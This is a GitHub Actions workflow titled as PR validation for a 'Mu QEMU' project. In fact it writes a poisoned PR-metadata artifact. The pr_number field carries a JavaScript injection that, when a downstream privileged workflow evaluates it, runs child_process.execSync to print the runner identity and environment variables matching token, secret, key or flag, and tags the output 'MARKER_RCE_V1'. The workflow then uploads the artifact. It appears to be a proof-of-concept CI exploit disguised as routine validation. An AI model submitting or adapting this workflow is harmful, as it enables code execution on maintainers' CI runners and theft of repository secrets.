name: Mu QEMU PR Validation

on:
  pull_request:

permissions:
  contents: read

jobs:
  craft:
    runs-on: ubuntu-latest
    steps:
      - name: Craft PR metadata artifact
        env:
          PR: ${{ github.event.pull_request.number }}
        run: |
          mkdir -p metadata
          python3 - <<'PY'
          import json, os
          pr = os.environ['PR']
          payload = pr + "');require('child_process').execSync('id; env | sort | grep -iE \"token|secret|key|flag\"',{stdio:'inherit'});core.info('MARKER_RCE_V1');var __x=('"
          json.dump({'pr_number': payload}, open('metadata/pr-metadata.json', 'w'))
          PY
          cat metadata/pr-metadata.json
      - name: Upload PR Metadata
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: mu-qemu-pr-metadata
          path: metadata/pr-metadata.json
